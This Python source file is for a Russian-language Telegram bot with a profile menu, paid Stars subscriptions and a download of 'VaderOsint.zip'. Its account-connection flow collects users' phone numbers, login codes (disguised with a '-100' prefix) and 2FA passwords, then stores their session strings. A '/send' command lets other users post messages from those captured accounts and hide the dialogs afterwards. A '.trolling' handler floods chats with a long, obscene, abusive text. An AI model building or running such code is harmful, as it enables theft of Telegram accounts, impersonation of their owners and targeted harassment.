from aiogram import Router,F,Bot
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from config import api_id,api_hash
from telethon import events
from telethon.errors import SessionPasswordNeededError
from aiogram.types import BufferedInputFile
import csv
import glob
from config import ADMIN_ID,TOKEN
import os
from database import SessionLocal, User, BroadCast
from datetime import datetime

from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from aiogram.types import CallbackQuery, Message, PreCheckoutQuery, LabeledPrice, FSInputFile
from aiogram.filters import CommandStart, Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext


bot = Bot(token=TOKEN)

router = Router()
Currency = 'XTR'

headers = {
    "Referer": "https://www.google.com/"
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
}

class SendMessage(StatesGroup):
    waiting_phone = State()
    waiting_text = State()
    waiting_chat = State()

class Find(StatesGroup):
    telephone = State()

class Account(StatesGroup):
    phone_num = State()
    code = State()
    password = State()


class BroadcastState(StatesGroup):
    wait_text = State()
def main_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='⬇️ Скачать',callback_data='download'),InlineKeyboardButton(text='👤 Профиль',callback_data='profile')],
        [InlineKeyboardButton(text='💰 Пополнить',callback_data='premium'),InlineKeyboardButton(text="👤 Аккаунт",callback_data='account')]
    ])
    return keyboard

payment = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Оплатить ⭐', pay=True)]
])





def admin_main_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊‍ Статистика", callback_data='stats')],
        [InlineKeyboardButton(text='✉️ Рассылка', callback_data='broadcast')],
        [InlineKeyboardButton(text='⚙️ Доп настройки', callback_data='settings')],
        [InlineKeyboardButton(text='👤 User Пользователей',callback_data='users_data')]
    ])
    return keyboard


def back_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Back', callback_data='back')],
    ])
    return keyboard




@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id == ADMIN_ID :
        await message.answer("Добро пожаловать в админ панель бота 🌍❤️!", reply_markup=admin_main_menu())
        return
    else:
        await message.answer('❌ У вас нет доступа к этой команде.')
        return



@router.callback_query(F.data == 'back')
async def back_menu(callback: CallbackQuery):
    await callback.message.answer("", reply_markup=admin_main_menu())
    await callback.answer('')


@router.callback_query(F.data == 'users_data')
async def send_user_list(callback: CallbackQuery):
    db = SessionLocal()
    users = db.query(User).all()
    db.close()

    if not users:
        await callback.answer("📭 Нет пользователей")
        return

    text = "👥 Список пользователей:\n\n"
    for user in users:
        name = user.name if user.name else "Без имени"
        status = "✅" if user.active else "❌"
        premium = "⭐" if user.premium else ""
        text += f"{status} {premium} {user.telegram_id} | {name}\n"

    await callback.message.answer(text)
    await callback.answer()


@router.callback_query(F.data == 'stats')
async def stats(callback:CallbackQuery):
    db = SessionLocal()
    total_users = db.query(User).count()
    active_users = db.query(User).filter(User.active == True).count()
    db.close()
    await callback.answer('')
    text = f'📊 Статистика:\n\n├ Всего 👀 пользователей: {total_users}\n├ Активных 🎮 пользователей : {active_users}\n└ Реферальная ссылка 📎 : t.me/sherlocks_find_bot'
    await callback.message.answer(f'{text}')


@router.callback_query(F.data == 'broadcast')
async def broadcast_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите текст для рассылки ✉️")
    await state.set_state(BroadcastState.wait_text)
    await callback.answer('')


@router.callback_query(F.data == 'settings')
async def settings(callback: CallbackQuery):
    await callback.message.answer("Здесь ничего нет ")
    await callback.answer('')
@router.message(BroadcastState.wait_text)
async def broadcast_mess(message: Message, state: FSMContext, bot: Bot):
    broadcast_text = message.text
    db = SessionLocal()
    users_list = db.query(User).filter(User.active == True).all()
    count = 0
    for user in users_list:
        try:
            await bot.send_message(user.telegram_id, broadcast_text)
            count += 1
        except Exception as e:
            print(f'Failed to send to {user.telegram_id}:{e}')
    new_broadcast = BroadCast(message=broadcast_text)
    db.add(new_broadcast)
    db.commit()
    db.close()
    await message.answer(f"Рассылка завершена ✉️ ! Сообщение отправлено {count} пользователям 🕵️.",
                         )
    await state.clear()





@router.message(CommandStart())
async def start(message: Message):
    db = SessionLocal()
    exiting = db.query(User).filter(User.telegram_id == message.from_user.id).first()
    if not exiting:
        new_user = User(telegram_id=message.from_user.id, name=message.from_user.full_name,
                        register_at=datetime.now().isoformat())
        db.add(new_user)
        db.commit()
    user = db.query(User).filter(User.telegram_id == message.from_user.id).first()
    if message.from_user.id == ADMIN_ID:
        user.premium = True
        db.commit()

    register_at = user.register_at
    premium = user.premium
    db.close()
    if premium is True:
        premium = '✅'
    else:
        premium = '❌'

    await message.reply(
        f'ℹ️ Вся необходимая информация о вашем профиле\n\n🏷️ <b>Имя:</b> <a href="tg://copy?text=ddddd">{message.from_user.full_name}</a>\n🆔 <b>Мой ID:</b> <a href="tg://copy?text=ddddddd">{message.from_user.id}</a>\n\n📆 <b>Регистрация:</b> <a href="tg://copy?text=fdddd">{register_at}</a>\n🔃 <b>TG Премиум:</b> {message.from_user.is_premium}\n\n💳 <b>Подписка:</b> {premium}\n🗣️ \n💰 Твой баланс: <a href="tg://copy?text=0.00">0.00 RUB</a>\n',
        reply_markup=main_menu(), parse_mode="HTML")


@router.callback_query(F.data == 'premium')
async def premium_get(callback:CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='💳 Подписка ', callback_data='subscribe')],
        [InlineKeyboardButton(text='🤝 Поддержка бота', callback_data='support_bot')]
    ])
    await callback.answer('')
    await callback.message.answer('🔃 Выберите вариант:', reply_markup=keyboard)

@router.callback_query(F.data == 'subscribe')
async def premium_getting(callback: CallbackQuery):
    prices = [LabeledPrice(label="XTR", amount=250)]

    db = SessionLocal()
    user = db.query(User).filter(User.telegram_id == str(callback.from_user.id)).first()

    if user and user.premium:
        await callback.answer('❌ У вас уже есть 💳 Подписка!', show_alert=True)
        db.close()
        return

    db.close()
    await callback.answer('')

    await callback.message.answer_invoice(
        title='💳 Premium подписка',
        description='• Доступ к расширенному поиску\n• Приоритетная поддержка',
        prices=prices,
        provider_token='',
        payload='premium_subscription',
        currency='XTR',
        reply_markup=payment
    )


@router.callback_query(F.data == 'support_bot')
async def support_to_bot(callback: CallbackQuery):
    prices = [LabeledPrice(label="XTR", amount=20)]
    await callback.answer('')

    await callback.message.answer_invoice(
        title='🤝 Поддержка бота',
        description='Поддержите разработку бота звездами ⭐',
        prices=prices,
        provider_token='',
        payload='bot_support',
        currency='XTR',
        reply_markup=payment,
    )


@router.pre_checkout_query()
async def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)


@router.message(F.successful_payment)
async def process_successful_payment(message: Message):
    payment_system = message.successful_payment
    payload = payment.invoice_payload  # Получаем payload
    user_id = str(message.from_user.id)

    db = SessionLocal()
    user = db.query(User).filter(User.telegram_id == user_id).first()

    if not user:

        user = User(telegram_id=user_id, name=message.from_user.full_name)
        db.add(user)
        db.commit()

    # Обрабатываем разные типы платежей
    if payload == 'premium_subscription':
        # Покупка подписки
        user.premium = True

        db.commit()

        await message.answer(
            f"✅ **Premium 💳 Подписка активирована!**\n\n"
            f"⭐ Получено: {payment.total_amount} звёзд\n"
            f"Спасибо за покупку! 🎉",
             message_effect_id="5104841245755180586"


        )

    elif payload == 'bot_support':

        await message.answer(
            f"🎉 **Спасибо за поддержку!** 🎉\n\n"
            f"⭐ Получено: {payment.total_amount} звёзд\n"
            f"👤 От: {message.from_user.full_name}\n\n"
            f"💝 Ваша поддержка помогает боту развиваться!",
            message_effect_id="5104841245755180586"
        )

    db.close()



@router.callback_query(F.data == 'download')
async def download_file(callback:CallbackQuery):
    file_path = "VaderOsint.zip"  # или путь к EXE

    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            await callback.message.answer_document(
                document=BufferedInputFile(
                    file.read(),
                    filename="Vader.zip"
                ),
                caption="✅ Ваш файл VaderOsint \n📨 Ссылка: https://www.dropbox.com/scl/fo/09s9q4jr5ipuf1de4g7hy/AK0oqF25xTUeLDX3M3C4__w?rlkey=quue6xsro1xyvody9k80je6ss&st=op84f0u2&dl=0"
            )
        await callback.answer("✅ Файл отправлен! ")
    else:
        await callback.answer("❌ Файл не найден \n📨 Ссылка: https://www.dropbox.com/scl/fo/09s9q4jr5ipuf1de4g7hy/AK0oqF25xTUeLDX3M3C4__w?rlkey=quue6xsro1xyvody9k80je6ss&st=op84f0u2&dl=0", show_alert=True)

@router.callback_query(F.data == 'profile')
async def profile_answer(callback:CallbackQuery):
    db = SessionLocal()

    user = db.query(User).filter(User.telegram_id == callback.from_user.id).first()

    register_at = user.register_at
    premium = user.premium
    if premium is True:
        premium = '✅'
    else:
        premium = '❌'

    await callback.answer('')

    db.close()
    await callback.message.reply(
        f'ℹ️ Вся необходимая информация о вашем профиле\n\n🏷️ <b>Имя:</b> <a href="tg://copy?text=ddddd">{callback.from_user.full_name}</a>\n🔗<b>Username:</b> @{callback.from_user.username}\n\n🆔 <b>Мой ID:</b> <a href="tg://copy?text=ddddddd">{callback.message.from_user.id}</a>\n📆 <b>Регистрация:</b> <a href="tg://copy?text=fdddd">{register_at}</a>\n🔃 <b>TG Премиум:</b> {callback.message.from_user.is_premium}\n\n💳 <b>Подписка:</b> {premium}\n🗣️ <b>Язык:</b> <b>{callback.message.from_user.language_code}</b>\n\n💰 Твой баланс: <a href="tg://copy?text=0.00">0.00 RUB</a>\n',
         parse_mode="HTML",reply_markup=main_menu())


@router.callback_query(F.data == 'account')
async def account_login(callback: CallbackQuery, state: FSMContext):
    await state.set_state(Account.phone_num)
    await callback.answer('')
    await callback.message.answer('Введи номер телефона 📲', parse_mode='HTML')


@router.message(Account.phone_num)
async def account_log(message: Message, state: FSMContext):
    phone = message.text.strip().replace(' ', '').replace('+', '')  # убираем + для хранения
    session_file = f'session_{phone}.txt'

    # ... (проверка существующей сессии)

    try:
        session = StringSession()
        client = TelegramClient(session, api_id, api_hash)
        await client.connect()

        # ВАЖНО: добавляем + при отправке запроса кода
        send_code = await client.send_code_request(phone=f'+{phone}')  # ← ИСПРАВЛЕНО
        print(send_code.phone_code_hash, api_hash, api_id)

        await state.update_data(
            hashing=send_code.phone_code_hash,
            client=client,
            phone=phone,  # храним без + для имени файла
            session_string=session.save(),
            session_file=session_file
        )

        await message.answer('⬆️ Введи код с -100 в начале:')
        await state.set_state(Account.code)

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await state.clear()


@router.message(Account.code)
async def account_code_sent(message: Message, state: FSMContext):
    data = await state.get_data()

    session = StringSession(data['session_string'])
    client = TelegramClient(session, api_id, api_hash)
    await client.connect()

    code = message.text.strip().replace('-100', '')

    if len(code) != 5 or not code.isdigit():
        await message.answer("❌ Нужно 5 цифр после -100")
        await client.disconnect()
        return

    try:
        # ВАЖНО: добавляем + при входе с кодом
        await client.sign_in(
            phone=f'+{data["phone"]}',  # ← ИСПРАВЛЕНО
            code=code,
            phone_code_hash=data['hashing']
        )

        if await client.is_user_authorized():
            me = await client.get_me()
            await message.answer(
                f'✅ Аккаунт @{me.username} подключен!\n\n<b>Инструкция</b>:\n Чтобы начать нужно написать(.trolling)\n Чтобы остановить нужно написать(.stop).',
                parse_mode='HTML')

            session_string = session.save()
            with open(data['session_file'], 'w') as f:
                f.write(session_string)

            await setup_client_handlers(client)

    except SessionPasswordNeededError:
        session_string = session.save()
        await state.update_data(
            session_string=session_string,
            client=client
        )
        await message.answer('🔒 Введите пароль 2FA:')
        await state.set_state(Account.password)
        return

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await client.disconnect()

    await state.clear()


@router.message(Account.password)
async def password_sign_in(message: Message, state: FSMContext):
    data = await state.get_data()

    # Восстанавливаем клиент из строки сессии
    session = StringSession(data['session_string'])
    client = TelegramClient(
        session,
        api_id,
        api_hash
    )

    await client.connect()

    try:
        await client.sign_in(password=message.text.strip())

        if await client.is_user_authorized():
            me = await client.get_me()
            await message.answer(f'✅ Аккаунт @{me.username} подключен!')

            # Сохраняем сессию в файл
            session_string = session.save()  # ← ПРАВИЛЬНО!
            with open(data['session_file'], 'w') as f:
                f.write(session_string)

            await setup_client_handlers(client)
        else:
            await message.answer('❌ Не удалось авторизоваться')
            await client.disconnect()

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await client.disconnect()

    await state.clear()


async def setup_client_handlers(client):
    @client.on(events.NewMessage(pattern='.trolling'))
    async def handler(event):

        existing_text = "Я тебе сынку тупой шлюхи твое сосалище переломаю своим огромным палающим хуем ведь ты ебанная мразота которая сидит здесь и терпит нихуевые харчки в свое прищавое ебало которое я использовал как тряпку для пола ибо ты сын шалавы парокопытной вообще не можешь дать весомого отпора, ты как слабый чуркобес у которого мать шлюха ебанная будешь постоянно в роли терпилы сидеть и мой член мусолить своими обжогшими ручками ведь я не раз предупреждал что мой член разогревается до температуры солнца, но ты сын бляди ебанной все равно пытался дать отпор и каждый раз отлетал в нокаут после первого точного удара и моему члену уже было скучно каждый раз тебя пинком к дому отправлять поэтому я взял твое свинное рыло в руки и приложил к стене которая была вся в моей сперме, и начал ломать твое горящее очко набирая скорость всё выше и выше, щегол ебучий когда ты уже поймёшь что на меня рыпаться не нужно ибо ты сын шалавы будешь отрабатывать каждый пинок под зад который ты получаешь после очередного отсоса пытаясь побороться с моей шиповоной подошвой которая вся в дерьме, ты сын шлюхи косоеблой до конца своей жизни будешь стоять на коленях и умолять мой огромный член поправить наконец-то свой свинной спермоприемник на котором прищей больше чем у родной матери зубов, но он как и раньше будет заплевывать тежёлыми маслянистыми харчками  твое окровавленное ебало на котором дохуище шрамов от моего палающего члена который твоя матушка закидывает к себе в ротан как школьники снюс"
        words = existing_text.split()
        await event.delete()

        # Флаг для остановки
        stop_flag = False

        # Обработчик для команды stop
        @client.on(events.NewMessage(pattern='.stop'))
        async def stop_handler(stop_event):
            nonlocal stop_flag
            if stop_event.chat_id == event.chat_id:
                stop_flag = True

                await stop_event.delete()

            # Бесконечный цикл

        while not stop_flag:
            for i in range(0, len(words), 2):
                if stop_flag:
                    break
                pair = ' '.join(words[i:i + 2])
                await event.respond(pair)
                await asyncio.sleep(0.02)

                # Небольшая пауза между циклами
            if not stop_flag:
                await asyncio.sleep(1)

@router.callback_query(F.data == 'profile')
async def profile_answer(callback:CallbackQuery):
    db = SessionLocal()

    user = db.query(User).filter(User.telegram_id == callback.from_user.id).first()

    register_at = user.register_at
    premium = user.premium
    if premium is True:
        premium = '✅'
    else:
        premium = '❌'

    await callback.answer('')

    db.close()
    await callback.message.reply(
        f'ℹ️ Вся необходимая информация о вашем профиле\n\n🏷️ <b>Имя:</b> <a href="tg://copy?text=ddddd">{callback.from_user.full_name}</a>\n🔗<b>Username:</b> @{callback.from_user.username}\n\n🆔 <b>Мой ID:</b> <a href="tg://copy?text=ddddddd">{callback.message.from_user.id}</a>\n📆 <b>Регистрация:</b> <a href="tg://copy?text=fdddd">{register_at}</a>\n🔃 <b>TG Премиум:</b> {callback.message.from_user.is_premium}\n\n💳 <b>Подписка:</b> {premium}\n🗣️ <b>Язык:</b> <b>{callback.message.from_user.language_code}</b>\n\n💰 Твой баланс: <a href="tg://copy?text=0.00">0.00 RUB</a>\n',
         parse_mode="HTML",reply_markup=main_menu())



@router.message(Command('send'))
async def send_message_start(message: Message, state: FSMContext):
    await state.set_state(SendMessage.waiting_phone)
    await message.answer('📱 Введите номер телефона подключенного аккаунта:')


@router.message(SendMessage.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip().replace(' ', '').replace('+', '')
    session_file = f'session_{phone}.txt'
    if user_id != ADMIN_ID:
        if phone == '375445389424':
            await message.answer('Ты совсем  ?')
            await state.clear()
            return
    if not os.path.exists(session_file):
        await message.answer('❌ Сессия не найдена. Сначала подключите аккаунт через 👤 Аккаунт')
        await state.clear()
        return

    try:
        with open(session_file, 'r') as f:
            session_string = f.read().strip()

        # Используем StringSession вместо файловой
        client = TelegramClient(
            StringSession(session_string),
            api_id,
            api_hash
        )
        await client.connect()

        if not await client.is_user_authorized():
            await message.answer('❌ Сессия есть, но аккаунт не авторизован')
            await client.disconnect()
            os.remove(session_file)
            await state.clear()
            return

        me = await client.get_me()

        # Сохраняем клиент и данные
        await state.update_data(
            client=client,
            phone=phone,
            session_file=session_file,
            username=me.username
        )

        await message.answer(f'✅ Аккаунт @{me.username} найден! Теперь введите текст сообщения:')
        await state.set_state(SendMessage.waiting_text)

    except Exception as e:
        await message.answer(f'❌ Ошибка при подключении: {e}')
        # Удаляем битую сессию
        if os.path.exists(session_file):
            os.remove(session_file)
        await state.clear()


@router.message(SendMessage.waiting_text)
async def process_text(message: Message, state: FSMContext):
    text = message.text.strip()

    if len(text) == 0:
        await message.answer('❌ Текст не может быть пустым. Введите текст:')
        return

    await state.update_data(text=text)
    await message.answer(
        '💬 Текст сохранен! Теперь введите username чата или ID:\n\n'
        'Примеры:\n'
        '• @username\n'
        '• 123456789 (ID чата)\n'

    )
    await state.set_state(SendMessage.waiting_chat)


@router.message(SendMessage.waiting_chat)
async def process_chat_and_send(message: Message, state: FSMContext):
    chat_identifier = message.text.strip()
    data = await state.get_data()

    client = data.get('client')
    text = data.get('text')
    phone = data.get('phone')
    username = data.get('username', 'неизвестно')

    if not client or not text:
        await message.answer('❌ Ошибка данных. Начните заново.')
        await state.clear()
        return

    try:
        # Очищаем идентификатор чата
        if chat_identifier.startswith('https://t.me/'):
            chat_identifier = '@' + chat_identifier.split('/')[-1]
        elif chat_identifier.startswith('@'):
            chat_identifier = chat_identifier
        else:
            try:
                chat_identifier = int(chat_identifier)
            except ValueError:
                chat_identifier = '@' + chat_identifier.lstrip('@')

        # Отправляем сообщение
        await client.send_message(chat_identifier, text)

        # Получаем объект чата (нужен для удаления)
        entity = await client.get_entity(chat_identifier)

        # Удаляем диалог (скрываем из ленты, но не удаляем историю и сам чат)
        await client.delete_dialog(entity)

        await message.answer(
            f'✅ Сообщение отправлено!\n\n'
            f'📱 Аккаунт: @{username}\n'
            f'💬 Чат: {chat_identifier}\n'
            f'🗑️ Диалог скрыт из ленты'
        )

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')

    finally:
        await client.disconnect()
        await state.clear()

